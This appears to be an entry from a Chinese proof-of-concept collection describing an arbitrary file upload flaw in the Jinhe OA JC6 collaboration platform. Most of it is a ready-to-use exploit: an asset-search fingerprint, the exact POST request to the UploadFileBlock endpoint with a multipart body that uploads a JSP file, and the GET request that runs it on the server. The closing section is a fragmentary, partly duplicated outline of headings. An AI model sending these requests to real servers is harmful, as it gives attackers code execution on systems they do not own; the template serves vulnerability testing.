# 金和OAJC6UploadFileBlock任意文件上传漏洞

- **系统**：金和OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="JC6金和协同管理平台"`
- **请求**：`POST /jc6/JHSoft.WCF/Attachment/UploadFileBlock HTTP/1.1`
- **关键头**：`Content-Length: 235`　`Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3`　`Content-Type: multipart/form-data; boundary=bvq7qlachxcoo24vher6`

**请求体 / payload**
```
--bvq7qlachxcoo24vher6
Content-Disposition: form-data; name="filename"; filename="xfpxtztxot.jsp"
<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--bvq7qlachxcoo24vher6--

上传文件位置
GET /jc6/upload/xfpxtztxot.jsp HTTP/1.1
Host:
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
```

**其他**
- 金和OA JC6 UploadFileBlock任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞简介
***
- 版本: * 金和OA